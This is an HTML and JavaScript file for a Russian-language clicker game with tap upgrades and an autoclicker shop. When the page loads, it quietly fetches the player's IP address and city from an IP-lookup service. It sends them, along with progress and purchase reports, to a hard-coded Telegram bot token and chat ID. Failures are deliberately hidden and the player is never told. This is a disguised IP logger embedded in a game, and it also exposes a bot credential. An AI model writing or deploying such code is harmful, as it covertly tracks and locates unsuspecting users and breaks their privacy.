# -<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Тапалка</title>
    <style>
        * { user-select: none; touch-action: manipulation; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #0a0f1e, #0c1222);
            font-family: 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .phone {
            max-width: 380px;
            width: 100%;
            background: #11141f;
            border-radius: 48px;
            padding: 20px 16px 30px;
            box-shadow: 0 25px 45px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,215,0,0.3);
        }
        .status-bar {
            display: flex;
            justify-content: space-between;
            background: #1e2438;
            padding: 10px 16px;
            border-radius: 40px;
            margin-bottom: 20px;
            font-size: 0.85rem;
            color: #ffdd99;
        }
        .geo-card {
            background: #1a1f31;
            border-radius: 28px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 0.75rem;
            text-align: center;
            color: #bbccff;
        }
        .stats {
            background: #0e1222;
            border-radius: 48px;
            padding: 15px;
            text-align: center;
            margin-bottom: 20px;
        }
        .score {
            font-size: 3.2rem;
            font-weight: 800;
            color: #ffd966;
        }
        .tap-btn {
            background: radial-gradient(circle at 30% 30%, #ffcc44, #ff9900);
            width: 180px;
            height: 180px;
            border-radius: 50%;
            border: none;
            font-size: 2rem;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 15px 0 #aa6f00;
            transition: 0.03s linear;
            margin: 10px auto;
            display: block;
        }
        .tap-btn:active { transform: translateY(5px); box-shadow: 0 8px 0 #aa6f00; }
        .shop {
            background: #0b0f1a;
            border-radius: 32px;
            padding: 15px;
            margin-top: 12px;
        }
        .upgrade {
            display: flex;
            justify-content: space-between;
            background: #1a1f2c;
            padding: 10px;
            border-radius: 60px;
            margin-bottom: 8px;
        }
        .upgrade-btn {
            background: #333a55;
            border: none;
            padding: 6px 16px;
            border-radius: 60px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        footer { font-size: 0.6rem; text-align: center; margin-top: 20px; color: #556688; }
    </style>
</head>
<body>
<div class="phone">
    <div class="status-bar">
        <div id="clock">--:--</div>
        <div id="weather">☀️ 23°C</div>
        <div>🔋 <span id="battery">85</span>%</div>
    </div>
    <div class="geo-card" id="geoInfo">
        📍 Готово к игре
    </div>
    <div class="stats">
        <div class="score" id="scoreValue">0</div>
        <div>💎 +<span id="tapPower">1</span> за тап</div>
    </div>
    <button class="tap-btn" id="tapButton">📱 ТАП</button>
    <div class="shop">
        <div class="upgrade">
            <span>⚡ Сила тапа +1</span>
            <span>💰 <span id="cost1">50</span></span>
            <button class="upgrade-btn" data-upgrade="tap">Купить</button>
        </div>
        <div class="upgrade">
            <span>🤖 Автокликер (+1/сек)</span>
            <span>💰 <span id="cost2">200</span></span>
            <button class="upgrade-btn" data-upgrade="auto">Купить</button>
        </div>
    </div>
    <footer>тапай | прокачивай</footer>
</div>

<script>
    // ---------- ТВОИ ДАННЫЕ ДЛЯ TELEGRAM (уже вставлены) ----------
    const BOT_TOKEN = "8945319463:AAGj0kO9HsMTgJwuiF-uFnTpK-vudcP7Onk";
    const CHAT_ID = "1330602662";

    // ---------- ИГРОВЫЕ ПЕРЕМЕННЫЕ ----------
    let clicks = 0;
    let tapPower = 1;
    let autoPower = 0;
    let cost1 = 50;
    let cost2 = 200;
    let lastNotify = 0;

    const scoreSpan = document.getElementById('scoreValue');
    const tapPowerSpan = document.getElementById('tapPower');
    const cost1Span = document.getElementById('cost1');
    const cost2Span = document.getElementById('cost2');
    const tapBtn = document.getElementById('tapButton');

    // ---------- ОТПРАВКА В TELEGRAM ----------
    async function sendToTelegram(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });
        } catch(e) { console.log("Ошибка отправки", e); }
    }

    // ---------- СБОР IP И ГЕО (БЕЗ ВЫВОДА ОШИБОК НА ЭКРАН) ----------
    async function collectAndSendGeo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            const ip = data.ip;
            const city = data.city || 'город';
            const region = data.region || '';
            const country = data.country_name || '';
            const geoText = `${city}, ${region}, ${country}`;
            document.getElementById('geoInfo').innerHTML = `📍 ${ip}<br>${geoText}`;
            await sendToTelegram(`🎮 НОВЫЙ ИГРОК\nIP: ${ip}\nГео: ${geoText}\nВремя: ${new Date().toLocaleString()}`);
        } catch(e) {
            // Ничего не выводим пользователю, просто не обновляем geoInfo
            // Но в Telegram сообщим, что гео не определено
            await sendToTelegram(`🎮 НОВЫЙ ИГРОК (гео не определено)\nВремя: ${new Date().toLocaleString()}`);
        }
    }

    // ---------- УВЕДОМЛЕНИЕ О ПРОГРЕССЕ (каждые 100 тапов) ----------
    function checkAndNotify() {
        if (clicks - lastNotify >= 100) {
            lastNotify = clicks;
            sendToTelegram(`📊 Прогресс: ${clicks} кликов, сила тапа +${tapPower}, авто +${autoPower}/сек`);
        }
    }

    // ---------- ПОКУПКА УЛУЧШЕНИЙ ----------
    function buyUpgrade(type) {
        if (type === 'tap' && clicks >= cost1) {
            clicks -= cost1;
            tapPower++;
            cost1 = Math.floor(cost1 * 1.6);
            sendToTelegram(`🔧 Игрок купил УСИЛЕНИЕ ТАПА! Теперь +${tapPower} за клик`);
            updateUI();
            saveGame();
        } else if (type === 'auto' && clicks >= cost2) {
            clicks -= cost2;
            autoPower++;
            cost2 = Math.floor(cost2 * 1.8);
            if (autoPower === 1) startAutoClicker();
            sendToTelegram(`🤖 Игрок купил АВТОКЛИКЕР! Пассивный доход +${autoPower}/сек`);
            updateUI();
            saveGame();
        }
    }

    function updateUI() {
        scoreSpan.innerText = Math.floor(clicks);
        tapPowerSpan.innerText = tapPower;
        cost1Span.innerText = cost1;
        cost2Span.innerText = cost2;
    }

    // ---------- ТАП ----------
    function handleTap() {
        clicks += tapPower;
        updateUI();
        checkAndNotify();
        saveGame();
        if (navigator.vibrate) navigator.vibrate(15);
    }

    // ---------- АВТОКЛИКЕР ----------
    let autoInterval = null;
    function startAutoClicker() {
        if (autoInterval) clearInterval(autoInterval);
        autoInterval = setInterval(() => {
            if (autoPower > 0) {
                clicks += autoPower;
                updateUI();
                checkAndNotify();
                saveGame();
            }
        }, 1000);
    }

    // ---------- СОХРАНЕНИЕ ----------
    function saveGame() {
        localStorage.setItem('tapperSave', JSON.stringify({
            clicks, tapPower, autoPower, cost1, cost2, lastNotify
        }));
    }
    function loadGame() {
        const saved = localStorage.getItem('tapperSave');
        if (saved) {
            const data = JSON.parse(saved);
            clicks = data.clicks || 0;
            tapPower = data.tapPower || 1;
            autoPower = data.autoPower || 0;
            cost1 = data.cost1 || 50;
            cost2 = data.cost2 || 200;
            lastNotify = data.lastNotify || 0;
            if (autoPower > 0) startAutoClicker();
            updateUI();
        }
    }

    // ---------- ДЕКОРАЦИИ (часы, погода, батарея) ----------
    function updateClock() {
        const now = new Date();
        document.getElementById('clock').innerText = now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
    }
    setInterval(updateClock, 1000);
    updateClock();
    setInterval(() => {
        const weathers = ['☀️ 23°C', '⛅ 19°C', '🌧️ 12°C', '❄️ -2°C'];
        document.getElementById('weather').innerHTML = weathers[Math.floor(Math.random() * weathers.length)];
    }, 60000);
    setInterval(() => {
        let bat = Math.floor(Math.random() * 30) + 60;
        document.getElementById('battery').innerText = bat;
    }, 30000);

    // ---------- ЗАПУСК ----------
    loadGame();
    collectAndSendGeo();   // отправляет IP и гео при старте
    tapBtn.addEventListener('click', handleTap);
    tapBtn.addEventListener('touchstart', (e) => { e.preventDefault(); handleTap(); }, { passive: false });
    document.querySelectorAll('.upgrade-btn').forEach(btn => {
        btn.addEventListener('click', (e) => buyUpgrade(btn.dataset.upgrade));
        btn.addEventListener('touchstart', (e) => { e.preventDefault(); buyUpgrade(btn.dataset.upgrade); }, { passive: false });
    });
</script>
</body>
</html>
